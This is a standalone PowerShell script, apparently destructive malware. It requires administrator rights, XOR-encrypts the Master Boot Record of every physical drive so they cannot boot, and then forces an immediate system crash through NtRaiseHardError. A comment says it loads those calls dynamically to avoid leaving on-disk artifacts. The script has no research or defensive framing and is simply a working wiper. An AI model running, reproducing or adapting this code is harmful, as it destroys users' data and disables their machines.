# Check if the script is running as admin
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "This script must be run as Admin to corrupt the MBR."
    return
}

# Get all physical drives using CIM
$drives = Get-CimInstance -ClassName Win32_DiskDrive

# XOR encryption key
$key = 0x55
$mbrOverwritten = $false

foreach ($drive in $drives) {
    $diskPath = "\\.\" + $drive.DeviceID
    
    try {
        # Open the disk for reading and writing
        $fs = [IO.File]::Open($diskPath, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite)

        # Read the first 512 bytes (MBR)
        $mbr = New-Object byte[] 512
        if ($fs.Read($mbr, 0, 512) -ne 512) {
            throw "Failed to read full MBR."
        }

        # XOR encrypt the MBR excluding the last 2 bytes (signature)
        for ($i = 0; $i -lt 510; $i++) {
            $mbr[$i] = $mbr[$i] -bxor $key
        }

        # Write the modified MBR back to the disk
        $fs.Seek(0, [IO.SeekOrigin]::Begin)
        $fs.Write($mbr, 0, 512)

        # Mark that at least one MBR was successfully overwritten
        $mbrOverwritten = $true
        Write-Host "Successfully encrypted MBR on $diskPath"

    } catch {
        Write-Host "Failed to process $diskPath - $_"
    } finally {
        # Close the file stream
        if ($fs) { $fs.Dispose() }
    }
}

# Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and prevents on-disk artifacts
if ($mbrOverwritten) {

    $asmName = New-Object Reflection.AssemblyName "DInvoke"
    $asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod = $asm.DefineDynamicModule("DynamicModule", $false)
    $type = $mod.DefineType("NativeMethods")

    function Add-DInvoke {
        param($DllName, $Name, $ParameterTypes, $ReturnType)
        $mb = $type.DefinePInvokeMethod($Name, $DllName, 'Public,Static,PinvokeImpl', 'Standard', $ReturnType, $ParameterTypes, 'Winapi', 'Auto')
        $mb.SetImplementationFlags('PreserveSig')
    }

    Add-DInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void]) | Out-Null
    Add-DInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void]) | Out-Null

    $NM = $type.CreateType()
    $NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
    $NM::NtRaiseHardError(3221225506, 0, 0, [IntPtr]::Zero, 6, [ref]0)

}
